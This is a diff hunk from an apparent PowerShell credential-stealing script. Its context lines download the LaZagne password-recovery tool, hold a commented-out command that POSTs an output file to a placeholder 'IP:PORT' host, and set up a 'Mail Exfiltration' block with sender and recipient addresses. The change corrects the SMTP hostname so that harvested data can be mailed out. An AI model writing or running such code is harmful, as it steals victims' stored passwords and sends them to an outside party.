@@ -99,10 +99,10 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 
 #Mail Exfiltration
-$smtp = "smtp.office365.com."
+$smtp = "smtp.office365.com"
 $From = "herbertvolkers@outlook.com"
 $To = "herbertswindel@outlook.com"
-$smtp = "smtp.office365.com."
+$smtp = "smtp.office365.com"
 $Subject = "Hier zijn uw gegevens kameraad"
 $Body = "kijk maar"
 
